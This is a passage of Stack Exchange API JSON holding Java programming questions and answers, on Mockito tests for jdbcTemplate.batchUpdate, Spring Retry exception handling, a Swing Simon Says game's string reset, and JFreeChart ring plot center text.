it is good solution to refactor your code by creating a factory. If you do not wish to create a factory, you can use below solution to unit test the logic written inside `batchUpdate` call.\r\n\r\n    import static org.mockito.Mockito.*;\r\n    \r\n    @Test\r\n    public void testJDBCBatchUpdate() {\r\n        String expectedSQL = &quot;Select * from TableName&quot;;\r\n        doAnswer(invocationOnMock -&gt; {\r\n     \r\n            String actualSQL =invocationOnMock.getArgumentAt(0, String.class);\r\n            assertEquals(expectedSQL, actualSQL);\r\n            \r\n            PreparedStatement preparedStatementMock=Mockito.mock(PreparedStatement.class);\r\n            BatchPreparedStatementSetter setter =invocationOnMock.getArgumentAt(1, BatchPreparedStatementSetter.class);\r\n            setter.setValues(preparedStatementMock, 0);\r\n    \t\t\r\n    \t\tverify(preparedStatementMock, times(1)).setObject(anyInt(), anyString());\r\n            \r\n            int batchSize=setter.getBatchSize();\r\n            assertEquals(expectedBatchSize,batchSize);\r\n            \r\n            return null;\r\n        }).when(jdbcTemplate).batchUpdate(anyString(), any(BatchPreparedStatementSetter.class));\r\n    \t\r\n        List&lt;Datum&gt; data = service.getData();\r\n        \r\n    \tverify(jdbcTemplate, times(1)).batchUpdate(anyString(),any(BatchPreparedStatementSetter.class)); \r\n    }","title":"Write unit test for jdbcTemplate.batchUpdate() method","body":"<p>As @davidxxx answered, it is good solution to refactor your code by creating a factory. If you do not wish to create a factory, you can use below solution to unit test the logic written inside <code>batchUpdate</code> call.</p>\n<pre><code>import static org.mockito.Mockito.*;\n\n@Test\npublic void testJDBCBatchUpdate() {\n    String expectedSQL = &quot;Select * from TableName&quot;;\n    doAnswer(invocationOnMock -&gt; {\n \n        String actualSQL =invocationOnMock.getArgumentAt(0, String.class);\n        assertEquals(expectedSQL, actualSQL);\n        \n        PreparedStatement preparedStatementMock=Mockito.mock(PreparedStatement.class);\n        BatchPreparedStatementSetter setter =invocationOnMock.getArgumentAt(1, BatchPreparedStatementSetter.class);\n        setter.setValues(preparedStatementMock, 0);\n        \n        verify(preparedStatementMock, times(1)).setObject(anyInt(), anyString());\n        \n        int batchSize=setter.getBatchSize();\n        assertEquals(expectedBatchSize,batchSize);\n        \n        return null;\n    }).when(jdbcTemplate).batchUpdate(anyString(), any(BatchPreparedStatementSetter.class));\n    \n    List&lt;Datum&gt; data = service.getData();\n    \n    verify(jdbcTemplate, times(1)).batchUpdate(anyString(),any(BatchPreparedStatementSetter.class)); \n}\n</code></pre>\n"}],"owner":{"account_id":6115119,"reputation":618,"user_id":4770397,"accept_rate":26,"display_name":"mayank bisht"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":7030,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":63085497,"answer_count":2,"score":1,"last_activity_date":1639575120,"creation_date":1595657683,"question_id":63085027,"body_markdown":"I have jdbcTemplate code, on which I am trying to write a unit test case.\r\n\r\n&lt;br/&gt;\r\n\r\n   \r\n\r\n         public void updateData(List&lt;Student&gt; students, String status){\r\n            try{jdbcTemplate.batchUpdate(&quot;update query&quot;, new BatchPreparedStatementSetter(){\r\n        \r\n                @Override\r\n                public int getBatchSize()\r\n                  return students.size();\r\n                }  \r\n                @Override\r\n                public void setValues(PreparedStatement ps int i){\r\n                  Student student = students.get(i);\r\n                  ps.setInt(1, student.getRollNo());\r\n                  ps.setString(2, student.getName());            \r\n                 }\r\n          });\r\n        }catch(Exception ex){}\r\n        \r\n     }\r\n\r\n\r\nBut the problem is I am unable to cover the full code. I am able to cover till:&lt;br/&gt;\r\n \r\n\r\n&gt; try{jdbcTemplate.batchUpdate(&quot;update query&quot;, new\r\n&gt; BatchPreparedStatementSetter(){\r\n\r\n**Test code snippet**\r\n\r\n    @Test\r\n    public void testMe(){\r\n    List&lt;Student&gt; students = new ArrayList&lt;&gt;();\r\n     mockedObject.updateData(students ,&quot;success&quot;);\r\n    \r\n    }\r\n\r\nPlease help.","title":"Write unit test for jdbcTemplate.batchUpdate() method","body":"<p>I have jdbcTemplate code, on which I am trying to write a unit test case.</p>\n<br/>\n<pre><code>     public void updateData(List&lt;Student&gt; students, String status){\n        try{jdbcTemplate.batchUpdate(&quot;update query&quot;, new BatchPreparedStatementSetter(){\n    \n            @Override\n            public int getBatchSize()\n              return students.size();\n            }  \n            @Override\n            public void setValues(PreparedStatement ps int i){\n              Student student = students.get(i);\n              ps.setInt(1, student.getRollNo());\n              ps.setString(2, student.getName());            \n             }\n      });\n    }catch(Exception ex){}\n    \n }\n</code></pre>\n<p>But the problem is I am unable to cover the full code. I am able to cover till:<br/></p>\n<blockquote>\n<p>try{jdbcTemplate.batchUpdate(&quot;update query&quot;, new\nBatchPreparedStatementSetter(){</p>\n</blockquote>\n<p><strong>Test code snippet</strong></p>\n<pre><code>@Test\npublic void testMe(){\nList&lt;Student&gt; students = new ArrayList&lt;&gt;();\n mockedObject.updateData(students ,&quot;success&quot;);\n\n}\n</code></pre>\n<p>Please help.</p>\n"},{"tags":["java","spring","spring-boot","exception","spring-retry"],"answers":[{"tags":[],"owner":{"account_id":4647011,"reputation":41835,"user_id":3764965,"accept_rate":94,"display_name":"Nikolas Charalambidis"},"down_vote_count":0,"up_vote_count":9,"is_accepted":true,"score":9,"last_activity_date":1639574883,"creation_date":1586526049,"answer_id":61141528,"question_id":61141431,"body_markdown":"You can use the [`include`][1] parameter of the annotation to handle multiple various exceptions:\r\n\r\n    @Retryable(\r\n        include = { IllegalAccessException.class, IOException.class }, \r\n        maxAttempts = 3, \r\n        backoff = @Backoff(delay = 3000))\r\n    public String getInfo() {\r\n        // some code\r\n    }\r\n\r\n  [1]: https://docs.spring.io/spring-retry/docs/api/current/org/springframework/retry/annotation/Retryable.html#include--","title":"Spring Retry - Exception problem and retries","body":"<p>You can use the <a href=\"https://docs.spring.io/spring-retry/docs/api/current/org/springframework/retry/annotation/Retryable.html#include--\" rel=\"noreferrer\"><code>include</code></a> parameter of the annotation to handle multiple various exceptions:</p>\n<pre><code>@Retryable(\n    include = { IllegalAccessException.class, IOException.class }, \n    maxAttempts = 3, \n    backoff = @Backoff(delay = 3000))\npublic String getInfo() {\n    // some code\n}\n</code></pre>\n"}],"owner":{"account_id":17071163,"reputation":45,"user_id":12351907,"display_name":"Med"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":4185,"favorite_count":0,"down_vote_count":0,"up_vote_count":4,"accepted_answer_id":61141528,"answer_count":1,"score":4,"last_activity_date":1639574883,"creation_date":1586525704,"question_id":61141431,"body_markdown":"How can we catch two different exceptions (ex. from `.lang` and `.io` packages) in the same block of `@Retryable` method. One, we return an `IOException` and the other we retry the method.\r\n\r\n```\r\n@Retryable(value = {Exception.calss } ,maxAttempts = 3, backoff = @Backoff(delay = 3000))\r\npublic String getInfo() {\r\n    try {\r\n        //here we have an executive code that may have an IOException\r\n    } catch(Exception ex) {\r\n        //And here i would catch the Exception \r\n        throw new Exception();\r\n    }   \r\n}\r\n```","title":"Spring Retry - Exception problem and retries","body":"<p>How can we catch two different exceptions (ex. from <code>.lang</code> and <code>.io</code> packages) in the same block of <code>@Retryable</code> method. One, we return an <code>IOException</code> and the other we retry the method.</p>\n\n<pre><code>@Retryable(value = {Exception.calss } ,maxAttempts = 3, backoff = @Backoff(delay = 3000))\npublic String getInfo() {\n    try {\n        //here we have an executive code that may have an IOException\n    } catch(Exception ex) {\n        //And here i would catch the Exception \n        throw new Exception();\n    }   \n}\n</code></pre>\n"},{"tags":["java","string","memory"],"comments":[{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":1,"creation_date":1639574121,"post_id":70364342,"comment_id":124382671,"body_markdown":"just assign it a (default) value, how else?","body":"just assign it a (default) value, how else?"}],"answers":[{"tags":[],"owner":{"account_id":23601242,"reputation":43,"user_id":17637693,"display_name":"benbeu"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639574448,"creation_date":1639574448,"answer_id":70364434,"question_id":70364342,"body_markdown":"You can reset a String variable by writing `playerPath = &quot;&quot;;`","title":"How can I reset the value of a string variable?","body":"<p>You can reset a String variable by writing <code>playerPath = &quot;&quot;;</code></p>\n"}],"owner":{"account_id":23628995,"reputation":1,"user_id":17661043,"display_name":"Monkey"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":164,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1639574448,"creation_date":1639574079,"question_id":70364342,"body_markdown":"  [1]: https://i.stack.imgur.com/Ik97X.jpg\r\nHey guys,\r\nI&#39;m trying to make a digital version of this Simon says game, and I can&#39;t get the path entered from the player to save correctly.\r\nEvery color corresponds to a number, so Green = 0, Red = 1, Yellow = 2, and Yellow = 3.\r\nThe problem is that the *playerPath* is never resetting, so it will just add the current entered path to the path of last round, making it seem incorrect when compared to the original *turnPath* which is just a substring of the *fullPath*.\r\nI attached all of the code below. Any help would be greatly appreciated.\r\n\r\n```\r\nimport java.awt.Color;\r\nimport java.awt.event.*;\r\nimport java.util.Random;\r\nimport javax.swing.JButton;\r\nimport javax.swing.JFrame;\r\n\r\npublic class Simon implements ActionListener {  \r\n    static JFrame f = new JFrame();  \r\n    static JButton greenButton = new JButton(&quot;Green&quot;);  \r\n    static JButton redButton = new JButton(&quot;Red&quot;);  \r\n    static JButton yellowButton = new JButton(&quot;Yellow&quot;);  \r\n    static JButton blueButton = new JButton(&quot;Blue&quot;);  \r\n    static String playerPath = &quot;&quot;;\r\n\tstatic int turn = 1;\r\n\tstatic int lostGame = 0;\r\n    static Random rand = new Random();\r\n    static String fullPath = &quot;&quot;; \r\n    static String turnPath;\r\n    \r\n    Simon() {\r\n    \tfor (int i = 0; i &lt; 100; i++) {\r\n    \t      int maxIndex = 4;\r\n    \t      int randomIndex = rand.nextInt(maxIndex);\r\n    \t      fullPath = fullPath + randomIndex;\r\n    \t    }      \t\r\n    \t    \r\n    \t    turnPath =  fullPath.substring(0,turn);\r\n    \t    \r\n \r\n    \tprepareGUI();\r\n    \tbuttonProperties();\r\n    \t\r\n    }\r\n    \r\npublic void prepareGUI() {\r\n    f.setSize(415,435);  \r\n    f.setLayout(null);  \r\n    f.setVisible(true);  \r\n    f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n}\r\n\r\npublic void buttonProperties() {\r\n    greenButton.setBounds(0,0,200,200);  \r\n    redButton.setBounds(200,0,200,200);  \r\n    yellowButton.setBounds(0,200,200,200);  \r\n    blueButton.setBounds(200,200,200,200);  \r\n \r\n    greenButton.setBackground(Color.black); \r\n    redButton.setBackground(Color.black);\r\n    yellowButton.setBackground(Color.black);\r\n    blueButton.setBackground(Color.black);\r\n    \r\n    greenButton.setOpaque(true);\r\n    redButton.setOpaque(true);\r\n    yellowButton.setOpaque(true);\r\n    blueButton.setOpaque(true);\r\n    \r\n    greenButton.setForeground(Color.green); \r\n    redButton.setForeground(Color.red);\r\n    yellowButton.setForeground(Color.yellow);\r\n    blueButton.setForeground(Color.blue);\r\n \r\n    f.add(greenButton);  \r\n    f.add(redButton);  \r\n    f.add(yellowButton);  \r\n    f.add(blueButton);  \r\n    \r\n    greenButton.addActionListener(this);\r\n    redButton.addActionListener(this);\r\n    yellowButton.addActionListener(this);\r\n    blueButton.addActionListener(this);\r\n    \r\n    greenButton.addMouseListener(new MouseAdapter() {\r\n        @Override\r\n        public void mousePressed(MouseEvent e) {\r\n            greenButton.setBackground(Color.green);\r\n        }\r\n\r\n        @Override\r\n        public void mouseReleased(MouseEvent e) {\r\n            greenButton.setBackground(Color.black);\r\n        }\r\n\r\n    });\r\n    \r\n    redButton.addMouseListener(new MouseAdapter() {\r\n        @Override\r\n        public void mousePressed(MouseEvent e) {\r\n            redButton.setBackground(Color.red);\r\n        }\r\n\r\n        @Override\r\n        public void mouseReleased(MouseEvent e) {\r\n            redButton.setBackground(Color.black);\r\n        }\r\n\r\n    });\r\n\r\n    yellowButton.addMouseListener(new MouseAdapter() {\r\n        @Override\r\n        public void mousePressed(MouseEvent e) {\r\n            yellowButton.setBackground(Color.yellow);\r\n        }\r\n\r\n        @Override\r\n        public void mouseReleased(MouseEvent e) {\r\n            yellowButton.setBackground(Color.black);\r\n        }\r\n\r\n    });\r\n    \r\n    blueButton.addMouseListener(new MouseAdapter() {\r\n        @Override\r\n        public void mousePressed(MouseEvent e) {\r\n            blueButton.setBackground(Color.blue);\r\n        }\r\n\r\n        @Override\r\n        public void mouseReleased(MouseEvent e) {\r\n            blueButton.setBackground(Color.black);\r\n        }\r\n\r\n    });\r\n}\r\n\r\n@Override\r\npublic void actionPerformed(ActionEvent e) {\r\n\t//Recording user input\r\n\r\n\t\r\n\t\tif (e.getActionCommand().matches(&quot;Green&quot;)) {\r\n\t\t\t\r\n\t\t\tplayerPath += &quot;0&quot;;\r\n\t\t\t\r\n\t\t}\r\n\t\telse if (e.getActionCommand().matches(&quot;Red&quot;)) {\r\n\t\t\t\r\n\t\t\tplayerPath += &quot;1&quot;;\r\n\t\t\t\r\n\t\t}\r\n\t\telse if (e.getActionCommand().matches(&quot;Yellow&quot;)) {\r\n\t\t\t\r\n\t\t\tplayerPath += &quot;2&quot;;\r\n\t\t\t\r\n\t\t}\r\n\t\telse if (e.getActionCommand().matches(&quot;Blue&quot;)) {\r\n\t\t\t\r\n\t\t\tplayerPath += &quot;3&quot;;\r\n\t\t\t\r\n\t\t}\r\n\t\r\n}\r\n\r\npublic static void main(String[] args) {  \r\n\twhile (lostGame &lt; 1) {\r\n\t\t\r\n\tlightButtons();\r\n\t\r\n\ttry {\r\n\t\tThread.sleep(1000 + (1000*turn));\r\n\t} catch (InterruptedException e) {\r\n\t\t\r\n\t\te.printStackTrace();\r\n\t}\r\n\t\r\n\tif (playerPath.equals(turnPath)) {\r\n        playerPath = &quot;&quot;;\r\n\t\tturn++;\t\r\n\t}\r\n\t\t\r\n\telse if (!(playerPath.equals(turnPath))) {\r\n\r\n\t\tlostGame += 1;\r\n\t\tSystem.out.println(playerPath);\r\n\t\tSystem.out.println(turnPath);\r\n\t\tSystem.out.println(&quot;GAME OVER&quot; + &#39;\\n&#39; + &quot;Your Score: &quot; + (turn-1));\r\n\t}\r\n\t\r\n\t}\r\n}\r\n\r\npublic static void lightButtons() {\r\n\tnew Simon();\r\n\t   \r\n\t\r\n    for (int i = 0; i &lt; turnPath.length(); i++) { // iterates through string based on turn number\r\n        if (turnPath.charAt(i) == &#39;0&#39;) {\t\t\t\t\t\r\n      \r\n        greenButton.setBackground(Color.green);\t\t\t//* &quot;Flashes&quot; a color at appropriate box\r\n          try {\r\n  \t\t\tThread.sleep(1000);\r\n  \t\t} catch (InterruptedException e) {\r\n\r\n  \t\t\te.printStackTrace();\r\n  \t\t}   \r\n          greenButton.setBackground(Color.black);  \t\t//*\r\n          try {\r\n    \t\t\tThread.sleep(100);\r\n    \t\t} catch (InterruptedException e) {\r\n\r\n    \t\t\te.printStackTrace();\r\n    \t\t}   \r\n        }\r\n        else if (turnPath.charAt(i) == &#39;1&#39;) {\r\n      \t  redButton.setBackground(Color.red);\t\t\t//*\r\n            try {\r\n    \t\t\tThread.sleep(1000);\r\n    \t\t} catch (InterruptedException e) {\r\n\r\n    \t\t\te.printStackTrace();\r\n    \t\t}   \r\n            redButton.setBackground(Color.black); \t\t//*\r\n            try {\r\n      \t\t\tThread.sleep(100);\r\n      \t\t} catch (InterruptedException e) {\r\n\r\n      \t\t\te.printStackTrace();\r\n      \t\t}   \r\n        }\r\n        else if (turnPath.charAt(i) == &#39;2&#39;) {\r\n      \t  yellowButton.setBackground(Color.yellow);\t\t//*\r\n            try {\r\n    \t\t\tThread.sleep(1000);\r\n    \t\t} catch (InterruptedException e) {\r\n\r\n    \t\t\te.printStackTrace();\r\n    \t\t}   \r\n            yellowButton.setBackground(Color.black); \t//*\r\n            try {\r\n      \t\t\tThread.sleep(100);\r\n      \t\t} catch (InterruptedException e) {\r\n\r\n      \t\t\te.printStackTrace();\r\n      \t\t}   \r\n        }\r\n        else if (turnPath.charAt(i) == &#39;3&#39;) {\r\n      \t  blueButton.setBackground(Color.blue);\t\t\t//*\r\n            try {\r\n    \t\t\tThread.sleep(1000);\r\n    \t\t} catch (InterruptedException e) {\r\n\r\n    \t\t\te.printStackTrace();\r\n    \t\t}   \r\n            blueButton.setBackground(Color.black);\t\t//* \r\n            try {\r\n      \t\t\tThread.sleep(100);\r\n      \t\t} catch (InterruptedException e) {\r\n\r\n      \t\t\te.printStackTrace();\r\n      \t\t} \r\n            \r\n        }\r\n        \r\n        \r\n      }\r\n    \r\n}\r\n} ```\r\n\r\n\r\n","title":"How can I reset the value of a string variable?","body":"<p>Hey guys,\nI'm trying to make a digital version of this Simon says game, and I can't get the path entered from the player to save correctly.\nEvery color corresponds to a number, so Green = 0, Red = 1, Yellow = 2, and Yellow = 3.\nThe problem is that the <em>playerPath</em> is never resetting, so it will just add the current entered path to the path of last round, making it seem incorrect when compared to the original <em>turnPath</em> which is just a substring of the <em>fullPath</em>.\nI attached all of the code below. Any help would be greatly appreciated.</p>\n<pre><code>import java.awt.Color;\nimport java.awt.event.*;\nimport java.util.Random;\nimport javax.swing.JButton;\nimport javax.swing.JFrame;\n\npublic class Simon implements ActionListener {  \n    static JFrame f = new JFrame();  \n    static JButton greenButton = new JButton(&quot;Green&quot;);  \n    static JButton redButton = new JButton(&quot;Red&quot;);  \n    static JButton yellowButton = new JButton(&quot;Yellow&quot;);  \n    static JButton blueButton = new JButton(&quot;Blue&quot;);  \n    static String playerPath = &quot;&quot;;\n    static int turn = 1;\n    static int lostGame = 0;\n    static Random rand = new Random();\n    static String fullPath = &quot;&quot;; \n    static String turnPath;\n    \n    Simon() {\n        for (int i = 0; i &lt; 100; i++) {\n              int maxIndex = 4;\n              int randomIndex = rand.nextInt(maxIndex);\n              fullPath = fullPath + randomIndex;\n            }       \n            \n            turnPath =  fullPath.substring(0,turn);\n            \n \n        prepareGUI();\n        buttonProperties();\n        \n    }\n    \npublic void prepareGUI() {\n    f.setSize(415,435);  \n    f.setLayout(null);  \n    f.setVisible(true);  \n    f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n}\n\npublic void buttonProperties() {\n    greenButton.setBounds(0,0,200,200);  \n    redButton.setBounds(200,0,200,200);  \n    yellowButton.setBounds(0,200,200,200);  \n    blueButton.setBounds(200,200,200,200);  \n \n    greenButton.setBackground(Color.black); \n    redButton.setBackground(Color.black);\n    yellowButton.setBackground(Color.black);\n    blueButton.setBackground(Color.black);\n    \n    greenButton.setOpaque(true);\n    redButton.setOpaque(true);\n    yellowButton.setOpaque(true);\n    blueButton.setOpaque(true);\n    \n    greenButton.setForeground(Color.green); \n    redButton.setForeground(Color.red);\n    yellowButton.setForeground(Color.yellow);\n    blueButton.setForeground(Color.blue);\n \n    f.add(greenButton);  \n    f.add(redButton);  \n    f.add(yellowButton);  \n    f.add(blueButton);  \n    \n    greenButton.addActionListener(this);\n    redButton.addActionListener(this);\n    yellowButton.addActionListener(this);\n    blueButton.addActionListener(this);\n    \n    greenButton.addMouseListener(new MouseAdapter() {\n        @Override\n        public void mousePressed(MouseEvent e) {\n            greenButton.setBackground(Color.green);\n        }\n\n        @Override\n        public void mouseReleased(MouseEvent e) {\n            greenButton.setBackground(Color.black);\n        }\n\n    });\n    \n    redButton.addMouseListener(new MouseAdapter() {\n        @Override\n        public void mousePressed(MouseEvent e) {\n            redButton.setBackground(Color.red);\n        }\n\n        @Override\n        public void mouseReleased(MouseEvent e) {\n            redButton.setBackground(Color.black);\n        }\n\n    });\n\n    yellowButton.addMouseListener(new MouseAdapter() {\n        @Override\n        public void mousePressed(MouseEvent e) {\n            yellowButton.setBackground(Color.yellow);\n        }\n\n        @Override\n        public void mouseReleased(MouseEvent e) {\n            yellowButton.setBackground(Color.black);\n        }\n\n    });\n    \n    blueButton.addMouseListener(new MouseAdapter() {\n        @Override\n        public void mousePressed(MouseEvent e) {\n            blueButton.setBackground(Color.blue);\n        }\n\n        @Override\n        public void mouseReleased(MouseEvent e) {\n            blueButton.setBackground(Color.black);\n        }\n\n    });\n}\n\n@Override\npublic void actionPerformed(ActionEvent e) {\n    //Recording user input\n\n    \n        if (e.getActionCommand().matches(&quot;Green&quot;)) {\n            \n            playerPath += &quot;0&quot;;\n            \n        }\n        else if (e.getActionCommand().matches(&quot;Red&quot;)) {\n            \n            playerPath += &quot;1&quot;;\n            \n        }\n        else if (e.getActionCommand().matches(&quot;Yellow&quot;)) {\n            \n            playerPath += &quot;2&quot;;\n            \n        }\n        else if (e.getActionCommand().matches(&quot;Blue&quot;)) {\n            \n            playerPath += &quot;3&quot;;\n            \n        }\n    \n}\n\npublic static void main(String[] args) {  \n    while (lostGame &lt; 1) {\n        \n    lightButtons();\n    \n    try {\n        Thread.sleep(1000 + (1000*turn));\n    } catch (InterruptedException e) {\n        \n        e.printStackTrace();\n    }\n    \n    if (playerPath.equals(turnPath)) {\n        playerPath = &quot;&quot;;\n        turn++; \n    }\n        \n    else if (!(playerPath.equals(turnPath))) {\n\n        lostGame += 1;\n        System.out.println(playerPath);\n        System.out.println(turnPath);\n        System.out.println(&quot;GAME OVER&quot; + '\\n' + &quot;Your Score: &quot; + (turn-1));\n    }\n    \n    }\n}\n\npublic static void lightButtons() {\n    new Simon();\n       \n    \n    for (int i = 0; i &lt; turnPath.length(); i++) { // iterates through string based on turn number\n        if (turnPath.charAt(i) == '0') {                    \n      \n        greenButton.setBackground(Color.green);         //* &quot;Flashes&quot; a color at appropriate box\n          try {\n            Thread.sleep(1000);\n        } catch (InterruptedException e) {\n\n            e.printStackTrace();\n        }   \n          greenButton.setBackground(Color.black);       //*\n          try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n\n                e.printStackTrace();\n            }   \n        }\n        else if (turnPath.charAt(i) == '1') {\n          redButton.setBackground(Color.red);           //*\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n\n                e.printStackTrace();\n            }   \n            redButton.setBackground(Color.black);       //*\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n\n                e.printStackTrace();\n            }   \n        }\n        else if (turnPath.charAt(i) == '2') {\n          yellowButton.setBackground(Color.yellow);     //*\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n\n                e.printStackTrace();\n            }   \n            yellowButton.setBackground(Color.black);    //*\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n\n                e.printStackTrace();\n            }   \n        }\n        else if (turnPath.charAt(i) == '3') {\n          blueButton.setBackground(Color.blue);         //*\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n\n                e.printStackTrace();\n            }   \n            blueButton.setBackground(Color.black);      //* \n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n\n                e.printStackTrace();\n            } \n            \n        }\n        \n        \n      }\n    \n}\n} ```\n\n\n</code></pre>\n"},{"tags":["java","jfreechart"],"answers":[{"tags":[],"owner":{"account_id":81822,"reputation":204250,"user_id":230513,"accept_rate":100,"display_name":"trashgod"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1639574415,"creation_date":1560963259,"answer_id":56672573,"question_id":56668582,"body_markdown":"It&#39;s not clear where your fragment is going awry, but this minimal complete example gives the expected result. As an aside, note the use of `Font.BOLD` for clarity and the use of `deriveFont()` to minimize the risk of an unfortunate [font substitution][1]; see also [*Initial Threads][2]*.\r\n\r\n\tpie.setCenterTextMode(CenterTextMode.VALUE);\r\n\tpie.setCenterTextFont(pie.getCenterTextFont().deriveFont(Font.BOLD, 30f));\r\n\tpie.setCenterTextColor(Color.getHSBColor(0, 1, 1));\r\n\r\n[![ring plot with value][3]][3]\r\n\r\n&gt;I tried `pie.setCenterText(&quot;Vijay&quot;);`\r\n\r\nInstead of `CenterTextMode.VALUE`; specify `CenterTextMode.FIXED`:\r\n\r\n    pie.setCenterTextMode(CenterTextMode.FIXED);\r\n    pie.setCenterText(&quot;Vijay&quot;);\r\n\r\n[![ring plot with fixed text][4]][4]\r\n\r\n&gt;The above code is not setting any value if the first dataset value is zero.\r\n\r\nCorrect. [`RingPlot::drawItem()`][5] ignores center text unless values exceed the rendering threshold; you can specify a value that passes the threshold yet displays correctly when formatted:\r\n\r\n    dataset.setValue(&quot;Critical&quot;, RingPlot.DEFAULT_MINIMUM_ARC_ANGLE_TO_DRAW);\r\n\r\n[![ring plot zero][6]][6]\r\n\r\n```\r\nimport java.awt.Color;\r\nimport java.awt.Dimension;\r\nimport java.awt.EventQueue;\r\nimport java.awt.Font;\r\nimport javax.swing.JFrame;\r\nimport org.jfree.chart.ChartFactory;\r\nimport org.jfree.chart.ChartPanel;\r\nimport org.jfree.chart.JFreeChart;\r\nimport org.jfree.chart.plot.CenterTextMode;\r\nimport org.jfree.chart.plot.RingPlot;\r\nimport org.jfree.data.general.DefaultPieDataset;\r\n\r\n/**\r\n * @see https://stackoverflow.com/a/56672573/230513\r\n * @see https://stackoverflow.com/a/37414338/230513\r\n */\r\npublic class TestRing {\r\n\r\n    private void display() {\r\n        JFrame f = new JFrame(&quot;Test&quot;);\r\n        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n        DefaultPieDataset dataset = new DefaultPieDataset();\r\n        dataset.setValue(&quot;Critical&quot;, Integer.valueOf(42));\r\n        dataset.setValue(&quot;Important&quot;, Integer.valueOf(21));\r\n        dataset.setValue(&quot;Moderate&quot;, Integer.valueOf(7));\r\n        dataset.setValue(&quot;Low&quot;, Integer.valueOf(3));\r\n        JFreeChart chart = ChartFactory.createRingChart(\r\n            &quot;Test&quot;, dataset, false, true, false);\r\n        RingPlot pie = (RingPlot) chart.getPlot();\r\n        pie.setSimpleLabels(true);\r\n        pie.setCenterTextMode(CenterTextMode.VALUE);\r\n        pie.setCenterTextFont(pie.getCenterTextFont().deriveFont(Font.BOLD, 30f));\r\n        pie.setCenterTextColor(Color.getHSBColor(0, 1, 1));\r\n        f.add(new ChartPanel(chart){\r\n            @Override\r\n            public Dimension getPreferredSize() {\r\n                return new Dimension(400, 400);\r\n            }\r\n        });\r\n        f.pack();\r\n        f.setLocationRelativeTo(null);\r\n        f.setVisible(true);\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        EventQueue.invokeLater(new TestRing()::display);\r\n    }\r\n}\r\n\r\n```\r\n\r\n  [1]: https://stackoverflow.com/q/26063828/230513\r\n  [2]: http://docs.oracle.com/javase/tutorial/uiswing/concurrency/initial.html\r\n  [3]: https://i.stack.imgur.com/Y341V.png\r\n  [4]: https://i.stack.imgur.com/rfDk7.png\r\n  [5]: https://github.com/jfree/jfreechart/blob/master/src/main/java/org/jfree/chart/plot/RingPlot.java#L492\r\n  [6]: https://i.stack.imgur.com/zCWWO.png","title":"Unable to display center text in ring chart","body":"<p>It's not clear where your fragment is going awry, but this minimal complete example gives the expected result. As an aside, note the use of <code>Font.BOLD</code> for clarity and the use of <code>deriveFont()</code> to minimize the risk of an unfortunate <a href=\"https://stackoverflow.com/q/26063828/230513\">font substitution</a>; see also <a href=\"http://docs.oracle.com/javase/tutorial/uiswing/concurrency/initial.html\" rel=\"nofollow noreferrer\">*Initial Threads</a>*.</p>\n<pre><code>pie.setCenterTextMode(CenterTextMode.VALUE);\npie.setCenterTextFont(pie.getCenterTextFont().deriveFont(Font.BOLD, 30f));\npie.setCenterTextColor(Color.getHSBColor(0, 1, 1));\n</code></pre>\n<p><a href=\"https://i.stack.imgur.com/Y341V.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Y341V.png\" alt=\"ring plot with value\" /></a></p>\n<blockquote>\n<p>I tried <code>pie.setCenterText(&quot;Vijay&quot;);</code></p>\n</blockquote>\n<p>Instead of <code>CenterTextMode.VALUE</code>; specify <code>CenterTextMode.FIXED</code>:</p>\n<pre><code>pie.setCenterTextMode(CenterTextMode.FIXED);\npie.setCenterText(&quot;Vijay&quot;);\n</code></pre>\n<p><a href=\"https://i.stack.imgur.com/rfDk7.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/rfDk7.png\" alt=\"ring plot with fixed text\" /></a></p>\n<blockquote>\n<p>The above code is not setting any value if the first dataset value is zero.</p>\n</blockquote>\n<p>Correct. <a href=\"https://github.com/jfree/jfreechart/blob/master/src/main/java/org/jfree/chart/plot/RingPlot.java#L492\" rel=\"nofollow noreferrer\"><code>RingPlot::drawItem()</code></a> ignores center text unless values exceed the rendering threshold; you can specify a value that passes the threshold yet displays correctly when formatted:</p>\n<pre><code>dataset.setValue(&quot;Critical&quot;, RingPlot.DEFAULT_MINIMUM_ARC_ANGLE_TO_DRAW);\n</code></pre>\n<p><a href=\"https://i.stack.imgur.com/zCWWO.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/zCWWO.png\" alt=\"ring plot zero\" /></a></p>\n<pre><code>import java.awt.Color;\nimport java.awt.Dimension;\nimport java.awt.EventQueue;\nimport java.awt.Font;\nimport javax.swing.JFrame;\nimport org.jfree.chart.ChartFactory;\nimport org.jfree.chart.ChartPanel;\nimport org.jfree.chart.JFreeChart;\nimport org.jfree.chart.plot.CenterTextMode;\nimport org.jfree.chart.plot.RingPlot;\nimport org.jfree.data.general.DefaultPieDataset;\n\n/**\n * @see https://stackoverflow.com/a/56672573/230513\n * @see https://stackoverflow.com/a/37414338/230513\n */\npublic class TestRing {\n\n    private void display() {\n        JFrame f = new JFrame(&quot;Test&quot;);\n        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        DefaultPieDataset dataset = new DefaultPieDataset();\n        